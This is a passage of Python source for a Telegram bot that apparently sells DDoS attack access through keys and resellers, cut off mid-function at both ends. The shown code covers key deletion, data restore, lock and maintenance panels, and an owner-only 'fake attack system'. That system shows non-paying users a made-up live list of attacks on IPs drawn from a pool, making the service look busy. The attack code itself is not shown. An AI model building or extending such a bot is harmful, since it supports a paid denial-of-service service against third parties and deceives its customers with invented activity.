    if cb_data == "delkey_cancel":
        send_msg(chat_id, "❌ Cancelled!")
        return
    
    key = cb_data.replace("delkey_", "")
    success, msg = delete_key(key, user_id)
    send_msg(chat_id, msg)

def handle_admin_del_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id)
    
    del_msg(chat_id, msg_id)
    
    count = 0
    if cb_data == "admin_del_unused":
        for k, v in list(keys.items()):
            if not v['used'] and not v.get('blocked'):
                del keys[k]
                count += 1
        save_data()
        send_msg(chat_id, f"✅ Deleted {count} unused keys!")
    elif cb_data == "admin_del_used":
        for k, v in list(keys.items()):
            if v['used']:
                expire_user_by_key(k)
                del keys[k]
                count += 1
        save_data()
        send_msg(chat_id, f"✅ Deleted {count} used keys! Users expired.")
    elif cb_data == "admin_del_all":
        for k, v in list(keys.items()):
            if v.get('used'):
                expire_user_by_key(k)
        keys.clear()
        for rid in resellers:
            resellers[rid]['keys_generated'] = []
        save_data()
        send_msg(chat_id, "✅ Deleted all keys! Users expired.")
    else:
        send_msg(chat_id, "❌ Cancelled!")

def handle_upload_user_json(chat_id, user_id, file_content):
    if is_bot_off and not is_owner(user_id):
        return False
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return False
    
    success, msg = restore_users_from_json(file_content)
    send_msg(chat_id, msg)
    return success

def handle_upload_reseller_json(chat_id, user_id, file_content):
    if is_bot_off and not is_owner(user_id):
        return False
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return False
    
    success, msg = restore_resellers_from_json(file_content)
    send_msg(chat_id, msg)
    return success

def handle_upload_keys_json(chat_id, user_id, file_content):
    if is_bot_off and not is_owner(user_id):
        return False
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return False
    
    success, msg = restore_keys_from_json(file_content)
    send_msg(chat_id, msg)
    return success

# ========== FAKE ATTACK SYSTEM ==========

def should_show_fake_attack(user_id):
    if not FAKE_ATTACKS_ENABLED:
        return False
    if is_owner(user_id):
        return False
    if is_admin(user_id):
        return False
    if is_reseller(user_id):
        return False
    user_id_str = str(user_id)
    if user_id_str in users and time.time() < users[user_id_str]:
        if user_id_str in user_key_map:
            key = user_key_map[user_id_str]
            if is_key_blocked(key):
                return True
        return False
    return True

def get_random_fake_ip():
    if FAKE_IP_POOL:
        return random.choice(FAKE_IP_POOL)
    return "0.0.0.0"

def get_random_fake_port():
    if FAKE_PORT_POOL:
        return random.choice(FAKE_PORT_POOL)
    return 0

_last_used_ip = None
_last_used_port = None

def generate_fake_attack(is_new=False):
    global _last_used_ip, _last_used_port, _last_used_combination, _used_combinations, _current_cycle_combinations
    
    if not FAKE_IP_POOL or not FAKE_PORT_POOL:
        return None
    
    all_combinations = [f"{ip}:{port}" for ip in FAKE_IP_POOL for port in FAKE_PORT_POOL]
    
    if len(_current_cycle_combinations) >= len(all_combinations):
        _current_cycle_combinations = []
        random.shuffle(all_combinations)
    
    available_combinations = [c for c in all_combinations if c not in _current_cycle_combinations]
    
    if not available_combinations:
        available_combinations = all_combinations.copy()
        _current_cycle_combinations = []
    
    selected = random.choice(available_combinations)
    ip, port = selected.split(':')
    port = int(port)
    
    _current_cycle_combinations.append(selected)
    _last_used_ip = ip
    _last_used_port = port
    _last_used_combination = selected
    
    total_time = random.randint(60, 300)
    
    if is_new:
        remaining = total_time
        percent = 0
    else:
        random_progress = random.randint(10, 90)
        elapsed = int((random_progress / 100) * total_time)
        remaining = total_time - elapsed
        percent = random_progress
    
    return {
        'ip': ip,
        'port': port,
        'remaining': remaining,
        'total_time': total_time,
        'percent': percent,
        'type': random.choice(['User', 'User', 'User', 'User', 'Group']),
    }

def generate_fake_status():
    global fake_status_attack_list, fake_last_add_time, _current_cycle_combinations
    
    if not FAKE_IP_POOL or not FAKE_PORT_POOL:
        return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: 0/{FAKE_CONCURRENT}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {FAKE_CONCURRENT}
┣ ⏱️ Max Time: {MAX_TIME}s
┗ ⏳ Cooldown: {COOLDOWN_SECONDS}s

⏳ Your Cooldown: ✅ Ready

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    for attack in fake_status_attack_list[:]:
        if attack and attack.get('remaining', 0) > 0:
            attack['remaining'] -= 1
            total = attack.get('total_time', 120)
            remaining = attack['remaining']
            if total > 0:
                attack['percent'] = int(((total - remaining) / total) * 100)
            else:
                attack['percent'] = 0
            if attack['percent'] > 100:
                attack['percent'] = 100
            if attack['percent'] < 0:
                attack['percent'] = 0
    
    for attack in fake_status_attack_list[:]:
        if attack.get('remaining', 0) <= 0:
            fake_status_attack_list.remove(attack)
    
    current_time = time.time()
    target_count = get_dynamic_attack_count()
    
    if len(fake_status_attack_list) == 0:
        needed = target_count
        for _ in range(needed):
            new_attack = generate_fake_attack(is_new=False)
            if new_attack:
                fake_status_attack_list.append(new_attack)
        fake_last_add_time = current_time
    elif len(fake_status_attack_list) < target_count and (current_time - fake_last_add_time) >= 120:
        new_attack = generate_fake_attack(is_new=True)
        if new_attack:
            fake_status_attack_list.append(new_attack)
            fake_last_add_time = current_time
    
    fake_status_attack_list.sort(key=lambda x: x.get('remaining', 0))
    
    status = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: {len(fake_status_attack_list)}/{FAKE_CONCURRENT}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for attack in fake_status_attack_list[:FAKE_CONCURRENT]:
        bar = get_progress_bar(attack['percent'])
        user_type = "👥 Group" if attack.get('type') == 'Group' else "👤 User"
        
        indicator = ""
        if attack['percent'] == 0:
            indicator = " 🆕 (NEW ATTACK - JUST STARTED)"
        elif attack['percent'] >= 90:
            indicator = " 🔥 (Almost done)"
        elif attack['percent'] <= 10:
            indicator = " 🚀 (Just started)"
        
        status += f"🎯 {attack['ip']}:{attack['port']}{indicator}\n   ⏱️ {attack['remaining']}s remaining\n   `{bar}` {attack['percent']}%\n   {user_type}\n\n"
    
    status += f"""
⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {FAKE_CONCURRENT}
┣ ⏱️ Max Time: {MAX_TIME}s
┗ ⏳ Cooldown: {COOLDOWN_SECONDS}s

⏳ Your Cooldown: ✅ Ready

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    return status

def update_fake_status():
    global fake_status_update_id, fake_status_chat_id
    
    while fake_status_chat_id and fake_status_update_id:
        try:
            if should_show_fake_attack(fake_status_chat_id):
                text = generate_fake_status()
                edit_message_text(fake_status_chat_id, fake_status_update_id, text)
            time.sleep(STATUS_UPDATE_INTERVAL)
        except:
            time.sleep(STATUS_UPDATE_INTERVAL)
            break

def send_fake_status(chat_id, user_id):
    global fake_status_update_id, fake_status_chat_id
    
    if is_bot_off and not is_owner(user_id):
        return False
    
    text = generate_fake_status()
    
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        ).json()
        
        if response.get('ok'):
            fake_status_update_id = response['result']['message_id']
            fake_status_chat_id = chat_id
            
            update_thread = threading.Thread(target=update_fake_status, daemon=True)
            update_thread.start()
            return True
    except:
        pass
    return False

def handle_addfakeip(chat_id, user_id, args):
    global FAKE_IP_POOL
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /addfakeip IP_ADDRESS\nExample: /addfakeip 185.142.53.42")
        return
    ip = args[0]
    if ip in FAKE_IP_POOL:
        send_msg(chat_id, f"❌ IP {ip} already in pool!")
        return
    FAKE_IP_POOL.append(ip)
    save_data()
    send_msg(chat_id, f"✅ Added {ip} to fake IP pool!\n📋 Total IPs: {len(FAKE_IP_POOL)}")

def handle_removefakeip(chat_id, user_id, args):
    global FAKE_IP_POOL
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removefakeip IP_ADDRESS")
        return
    ip = args[0]
    if ip not in FAKE_IP_POOL:
        send_msg(chat_id, f"❌ IP {ip} not found!")
        return
    FAKE_IP_POOL.remove(ip)
    save_data()
    send_msg(chat_id, f"✅ Removed {ip} from fake IP pool!\n📋 Total IPs: {len(FAKE_IP_POOL)}")

def handle_listfakeip(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not FAKE_IP_POOL:
        send_msg(chat_id, "📋 Fake IP pool is empty! Use /addfakeip to add IPs.")
        return
    ip_list = "\n".join([f"🔹 {ip}" for ip in FAKE_IP_POOL])
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 FAKE IP POOL
━━━━━━━━━━━━━━━━━━━━━━━━
{ip_list}
━━━━━━━━━━━━━━━━━━━━━━━━
Total: {len(FAKE_IP_POOL)} IPs
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_addfakeport(chat_id, user_id, args):
    global FAKE_PORT_POOL
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /addfakeport PORT\nExample: /addfakeport 443")
        return
    try:
        port = int(args[0])
        if port < 1 or port > 65535:
            send_msg(chat_id, "❌ Invalid port! Must be 1-65535")
            return
        if port in FAKE_PORT_POOL:
            send_msg(chat_id, f"❌ Port {port} already in pool!")
            return
        FAKE_PORT_POOL.append(port)
        save_data()
        send_msg(chat_id, f"✅ Added port {port} to fake port pool!\n📋 Total ports: {len(FAKE_PORT_POOL)}")
    except:
        send_msg(chat_id, "❌ Invalid port!")

def handle_removefakeport(chat_id, user_id, args):
    global FAKE_PORT_POOL
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removefakeport PORT")
        return
    try:
        port = int(args[0])
        if port not in FAKE_PORT_POOL:
            send_msg(chat_id, f"❌ Port {port} not found!")
            return
        FAKE_PORT_POOL.remove(port)
        save_data()
        send_msg(chat_id, f"✅ Removed port {port} from fake port pool!\n📋 Total ports: {len(FAKE_PORT_POOL)}")
    except:
        send_msg(chat_id, "❌ Invalid port!")

def handle_listfakeport(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not FAKE_PORT_POOL:
        send_msg(chat_id, "📋 Fake port pool is empty! Use /addfakeport to add ports.")
        return
    port_list = "\n".join([f"🔸 {port}" for port in FAKE_PORT_POOL])
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 FAKE PORT POOL
━━━━━━━━━━━━━━━━━━━━━━━━
{port_list}
━━━━━━━━━━━━━━━━━━━━━━━━
Total: {len(FAKE_PORT_POOL)} ports
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_setfakeconcurrent(chat_id, user_id, args):
    global FAKE_CONCURRENT
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setfakeconcurrent NUMBER\nExample: /setfakeconcurrent 10")
        return
    try:
        FAKE_CONCURRENT = int(args[0])
        if FAKE_CONCURRENT < 1:
            FAKE_CONCURRENT = 1
        save_data()
        send_msg(chat_id, f"✅ Fake concurrent limit set to: {FAKE_CONCURRENT}")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_fakeon(chat_id, user_id):
    global FAKE_ATTACKS_ENABLED
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    FAKE_ATTACKS_ENABLED = True
    save_data()
    send_msg(chat_id, "✅ Fake attack system ENABLED")

def handle_fakeoff(chat_id, user_id):
    global FAKE_ATTACKS_ENABLED
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    FAKE_ATTACKS_ENABLED = False
    save_data()
    send_msg(chat_id, "❌ Fake attack system DISABLED")

def handle_fakeconfig(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🎭 FAKE ATTACK SYSTEM
━━━━━━━━━━━━━━━━━━━━━━━━
Status: {'✅ ENABLED' if FAKE_ATTACKS_ENABLED else '❌ DISABLED'}
Fake Concurrent: {FAKE_CONCURRENT}
IP Pool: {len(FAKE_IP_POOL)} IPs
Port Pool: {len(FAKE_PORT_POOL)} ports
━━━━━━━━━━━━━━━━━━━━━━━━
Commands:
/fakeon - Enable
/fakeoff - Disable
/addfakeip IP - Add IP
/removefakeip IP - Remove IP
/listfakeip - List all IPs
/addfakeport PORT - Add port
/removefakeport PORT - Remove port
/listfakeport - List all ports
/setfakeconcurrent NUM - Set limit
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_setfakeattackrange(chat_id, user_id, args):
    global FAKE_ATTACK_RANGE
    if not is_owner(user_id):
        send_msg(chat_id, "❌ Only owner can use this command!")
        return
    
    if len(args) == 0:
        if FAKE_ATTACK_RANGE is None:
            send_msg(chat_id, "Current: AUTO mode (based on IP count)")
        else:
            send_msg(chat_id, f"Current: {FAKE_ATTACK_RANGE[0]} - {FAKE_ATTACK_RANGE[1]} attacks")
        return
    
    if args[0].lower() == "auto":
        FAKE_ATTACK_RANGE = None
        save_data()
        send_msg(chat_id, "✅ Fake attack range set to: AUTO mode")
        return
    
    if len(args) == 2:
        try:
            min_val = int(args[0])
            max_val = int(args[1])
            if min_val < 1:
                send_msg(chat_id, "❌ Minimum attacks cannot be less than 1!")
                return
            if max_val > 20:
                send_msg(chat_id, "❌ Maximum attacks cannot be more than 20!")
                return
            if min_val > max_val:
                send_msg(chat_id, "❌ Minimum cannot be greater than maximum!")
                return
            FAKE_ATTACK_RANGE = (min_val, max_val)
            save_data()
            send_msg(chat_id, f"✅ Fake attack range set to: {min_val} - {max_val} attacks")
        except:
            send_msg(chat_id, "❌ Invalid numbers! Use: /setfakeattackrange 4 8")
        return
    
    send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 /setfakeattackrange USAGE
━━━━━━━━━━━━━━━━━━━━━━━━
/setfakeattackrange 4 8  → Fixed 4-8 attacks
/setfakeattackrange 6 9  → Fixed 6-9 attacks
/setfakeattackrange auto  → Back to auto mode
/setfakeattackrange       → Show current setting
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_panel(chat_id, user_id):
    if not is_owner(user_id):
        send_msg(chat_id, "❌ You are not authorized to use this panel!")
        return
    
    ip_count = len(FAKE_IP_POOL)
    port_count = len(FAKE_PORT_POOL)
    time_count = len(FAKE_TIME_POOL)
    
    current_range = "AUTO" if FAKE_ATTACK_RANGE is None else f"{FAKE_ATTACK_RANGE[0]} - {FAKE_ATTACK_RANGE[1]}"
    
    buttons = [
        [{"text": "🎯 SET ATTACK RANGE", "callback_data": "owner_set_range"}],
        [{"text": "🌐 ADD IP", "callback_data": "owner_add_ip"}, {"text": "🌐 REMOVE IP", "callback_data": "owner_remove_ip"}],
        [{"text": "🔌 ADD PORT", "callback_data": "owner_add_port"}, {"text": "🔌 REMOVE PORT", "callback_data": "owner_remove_port"}],
        [{"text": "📋 LIST IPs", "callback_data": "owner_list_ip"}, {"text": "📋 LIST PORTS", "callback_data": "owner_list_port"}],
        [{"text": "⚙️ FAKE CONCURRENT", "callback_data": "owner_fake_concurrent"}],
        [{"text": "🔒 FAKE ON/OFF", "callback_data": "owner_fake_toggle"}],
        [{"text": "📊 VIEW FULL CONFIG", "callback_data": "owner_view_config"}],
        [{"text": "🔄 RESET IP/PORT CYCLES", "callback_data": "owner_reset_cycles"}],
        [{"text": "❌ CLOSE PANEL", "callback_data": "owner_close"}]
    ]
    
    send_buttons(chat_id, f"""
╔════════════════════════════════╗
║      👑 OWNER SECRET PANEL     ║
╚════════════════════════════════╝

📊 CURRENT CONFIGURATION:
├ 🎯 Attack Range: {current_range}
├ 🌐 IP Pool: {ip_count} IPs
├ 🔌 Port Pool: {port_count} ports
├ ⏱️ Time Pool: {time_count} times
├ ⚡ Fake Concurrent: {FAKE_CONCURRENT}
└ 🎭 Fake System: {'✅ ON' if FAKE_ATTACKS_ENABLED else '❌ OFF'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Select an option below:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)

def handle_owner_set_range_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 SET ATTACK RANGE
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/setfakeattackrange 4 8
/setfakeattackrange 6 9
/setfakeattackrange auto
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_add_ip_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
🌐 ADD FAKE IP
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/addfakeip IP_ADDRESS
Example: /addfakeip 185.142.53.42
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_remove_ip_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
🌐 REMOVE FAKE IP
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/removefakeip IP_ADDRESS
Example: /removefakeip 185.142.53.42
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_add_port_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
🔌 ADD FAKE PORT
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/addfakeport PORT
Example: /addfakeport 443
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_remove_port_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
🔌 REMOVE FAKE PORT
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/removefakeport PORT
Example: /removefakeport 443
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_list_ip_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    if not FAKE_IP_POOL:
        send_msg(callback_query["message"]["chat"]["id"], "📋 No fake IPs added yet!")
        return
    ip_list = "\n".join([f"🔹 {ip}" for ip in FAKE_IP_POOL])
    send_msg(callback_query["message"]["chat"]["id"], f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 FAKE IP POOL
━━━━━━━━━━━━━━━━━━━━━━━━
{ip_list}
━━━━━━━━━━━━━━━━━━━━━━━━
Total: {len(FAKE_IP_POOL)} IPs
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_list_port_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    if not FAKE_PORT_POOL:
        send_msg(callback_query["message"]["chat"]["id"], "📋 No fake ports added yet!")
        return
    port_list = "\n".join([f"🔸 {port}" for port in FAKE_PORT_POOL])
    send_msg(callback_query["message"]["chat"]["id"], f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 FAKE PORT POOL
━━━━━━━━━━━━━━━━━━━━━━━━
{port_list}
━━━━━━━━━━━━━━━━━━━━━━━━
Total: {len(FAKE_PORT_POOL)} ports
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_view_config_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    
    ip_list = "\n".join([f"🔹 {ip}" for ip in FAKE_IP_POOL[:10]]) if FAKE_IP_POOL else "Empty"
    if len(FAKE_IP_POOL) > 10:
        ip_list += f"\n... and {len(FAKE_IP_POOL) - 10} more"
    
    port_list = "\n".join([f"🔸 {port}" for port in FAKE_PORT_POOL[:10]]) if FAKE_PORT_POOL else "Empty"
    if len(FAKE_PORT_POOL) > 10:
        port_list += f"\n... and {len(FAKE_PORT_POOL) - 10} more"
    
    time_list = "\n".join([f"⏱️ {t}s" for t in FAKE_TIME_POOL]) if FAKE_TIME_POOL else "Empty"
    
    send_msg(callback_query["message"]["chat"]["id"], f"""
╔════════════════════════════════╗
║      📊 FULL CONFIGURATION     ║
╚════════════════════════════════╝

🌐 IP POOL ({len(FAKE_IP_POOL)} IPs):
{ip_list}

🔌 PORT POOL ({len(FAKE_PORT_POOL)} ports):
{port_list}

⏱️ TIME POOL ({len(FAKE_TIME_POOL)} times):
{time_list}

⚙️ OTHER SETTINGS:
├ Fake Concurrent: {FAKE_CONCURRENT}
├ Fake System: {'ON' if FAKE_ATTACKS_ENABLED else 'OFF'}
├ Attack Range: {'AUTO' if FAKE_ATTACK_RANGE is None else f"{FAKE_ATTACK_RANGE[0]} - {FAKE_ATTACK_RANGE[1]}"}
├ Real Max Concurrent: {MAX_CONCURRENT}
├ Max Time: {MAX_TIME}s
├ Cooldown: {COOLDOWN_SECONDS}s
└ Daily Limit: {DAILY_LIMIT}
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_reset_cycles_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    
    global _used_ips_this_cycle, _used_ports_this_cycle
    _used_ips_this_cycle.clear()
    _used_ports_this_cycle.clear()
    if FAKE_IP_POOL:
        random.shuffle(FAKE_IP_POOL)
    if FAKE_PORT_POOL:
        random.shuffle(FAKE_PORT_POOL)
    
    answer_callback(callback_query["id"], "🔄 Cycles reset!")
    send_msg(callback_query["message"]["chat"]["id"], "✅ IP and port cycles have been reset! New cycle started.")

def handle_owner_fake_toggle_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    
    global FAKE_ATTACKS_ENABLED
    FAKE_ATTACKS_ENABLED = not FAKE_ATTACKS_ENABLED
    save_data()
    
    status = "ON" if FAKE_ATTACKS_ENABLED else "OFF"
    answer_callback(callback_query["id"], f"🎭 Fake system {status}")
    send_msg(callback_query["message"]["chat"]["id"], f"✅ Fake attack system turned {status}")

def handle_owner_fake_concurrent_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    send_msg(callback_query["message"]["chat"]["id"], """
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ SET FAKE CONCURRENT
━━━━━━━━━━━━━━━━━━━━━━━━
Use command:
/setfakeconcurrent NUMBER
Example: /setfakeconcurrent 10
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_owner_close_callback(callback_query):
    if not is_owner(callback_query["from"]["id"]):
        answer_callback(callback_query["id"], "❌ Owner only!")
        return
    answer_callback(callback_query["id"])
    del_msg(callback_query["message"]["chat"]["id"], callback_query["message"]["message_id"])

def get_dynamic_attack_count():
    if FAKE_ATTACK_RANGE is not None:
        return random.randint(FAKE_ATTACK_RANGE[0], FAKE_ATTACK_RANGE[1])
    
    if FAKE_IP_POOL:
        max_possible = min(len(FAKE_IP_POOL), FAKE_CONCURRENT)
        return random.randint(1, max(2, max_possible))
    return random.randint(1, 3)

def handle_admin_lock_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        send_msg(chat_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id, "🔒 Bot locked!")
    
    global is_locked
    is_locked = True
    save_data()
    
    buttons = [
        [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
        [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
        [{"text": "📊 STATUS", "callback_data": "admin_status"}]
    ]
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": f"""
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: ON
🔧 Maintenance: {'ON' if is_maintenance else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Bot has been LOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━""",
                "reply_markup": {"inline_keyboard": buttons}
            },
            timeout=3
        )
    except:
        pass

def handle_admin_unlock_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        send_msg(chat_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id, "🔓 Bot unlocked!")
    
    global is_locked
    is_locked = False
    save_data()
    
    buttons = [
        [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
        [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
        [{"text": "📊 STATUS", "callback_data": "admin_status"}]
    ]
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": f"""
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: OFF
🔧 Maintenance: {'ON' if is_maintenance else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Bot has been UNLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━""",
                "reply_markup": {"inline_keyboard": buttons}
            },
            timeout=3
        )
    except:
        pass

def handle_admin_maint_on_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        send_msg(chat_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id, "🔧 Maintenance mode ON!")
    
    global is_maintenance
    is_maintenance = True
    save_data()
    
    buttons = [
        [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
        [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
        [{"text": "📊 STATUS", "callback_data": "admin_status"}]
    ]
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": f"""
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: {'ON' if is_locked else 'OFF'}
🔧 Maintenance: ON
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Maintenance Mode is now ON!
━━━━━━━━━━━━━━━━━━━━━━━━""",
                "reply_markup": {"inline_keyboard": buttons}
            },
            timeout=3
        )
    except:
        pass

def handle_admin_maint_off_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        send_msg(chat_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id, "✅ Maintenance mode OFF!")
    
    global is_maintenance
    is_maintenance = False
    save_data()
    
    buttons = [
        [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
        [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
        [{"text": "📊 STATUS", "callback_data": "admin_status"}]
    ]
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": f"""
